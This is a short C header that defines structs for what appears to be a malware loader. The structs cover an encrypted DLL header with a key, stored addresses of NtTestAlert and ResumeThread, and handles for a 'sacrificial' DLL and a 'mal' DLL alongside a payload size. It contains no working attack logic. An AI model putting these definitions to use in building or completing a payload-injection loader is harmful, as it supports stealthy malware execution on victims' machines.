#pragma once

#include <windef.h>


typedef struct _DLL_HEADER {
    DWORD header; //4 bytes header
    DWORD key; //4 bytes encryption key
    SIZE_T funcSize; //8 bytes

} DLL_HEADER, * PDLL_HEADER;




typedef struct _FUNCTION_ADDRESSES {
    PVOID NtWaitForSingleObjectAddress;
    PVOID NtTestAlertAddress;
    PVOID MessageBoxAddress;
    PVOID ResumeThreadAddress;
} FUNCTION_ADDRESSES, * PFUNCTION_ADDRESSES;

typedef struct _CORE_ARGUMENTS {

    PBYTE myBase;
    HANDLE sacDLLHandle;
    HANDLE malDLLHandle;
    SIZE_T viewSize;

} CORE_ARGUMENTS, * PCORE_ARGUMENTS;


typedef struct _SAC_DLL_HEADER
{
    HANDLE sac_dll_handle;
    HANDLE mal_dll_handle;
    SIZE_T payload_size;
    PBYTE to_free;

} SAC_DLL_HEADER, * PSAC_DLL_HEADER;


